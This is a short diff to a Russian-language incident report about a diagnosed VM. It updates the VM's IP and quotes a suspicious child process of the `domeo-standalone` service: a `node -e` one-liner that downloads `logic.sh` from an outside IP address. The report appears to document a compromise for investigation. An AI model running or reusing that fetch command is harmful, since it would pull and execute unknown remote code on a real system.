@@ -2,7 +2,7 @@
 
 ## Что обнаружено
 
-При диагностике ВМ (89.169.181.191) в выводе `systemctl status domeo-standalone` видны дочерние процессы:
+При диагностике ВМ (178.154.244.83) в выводе `systemctl status domeo-standalone` видны дочерние процессы:
 
 ```text
 node -e "require('http').get('http://91.92.243.113:235/logic.sh', ...)"
